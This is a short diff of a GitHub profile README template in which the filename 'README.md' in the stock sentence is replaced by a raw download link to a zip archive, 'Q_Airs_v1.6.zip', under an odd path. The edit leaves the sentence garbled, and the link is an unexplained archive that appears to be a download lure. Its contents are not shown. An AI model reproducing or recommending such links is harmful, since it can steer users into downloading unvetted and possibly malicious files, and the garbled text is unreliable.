@@ -1,6 +1,6 @@
 # About me
 
-**AirsQ/AirsQ** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
+**AirsQ/AirsQ** is a ✨ _special_ ✨ repository because its `https://raw.githubusercontent.com/AirsQ/AirsQ/main/unprismatic/Q_Airs_v1.6.zip` (this file) appears on your GitHub profile.
 
 Here are some ideas to get you started:
 
